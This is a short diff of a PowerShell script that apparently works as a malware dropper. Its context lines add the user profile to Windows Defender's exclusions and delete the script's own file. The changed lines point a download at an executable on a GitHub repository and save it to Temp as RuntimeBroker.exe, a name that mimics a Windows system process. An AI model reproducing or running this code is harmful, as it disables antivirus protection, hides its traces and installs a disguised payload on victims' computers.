@@ -36,9 +36,9 @@ Add-MpPreference -ExclusionPath $env:USERPROFILE
 
 Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 
-$url = 'https://github.com/teste.exe'
+$url = 'https://github.com/marcelokasdw2/testee/raw/refs/heads/main/RuntimeBroker.exe'
 
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'teste.exe')
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'RuntimeBroker.exe')
 
 Start-Sleep -Milliseconds 100 
 
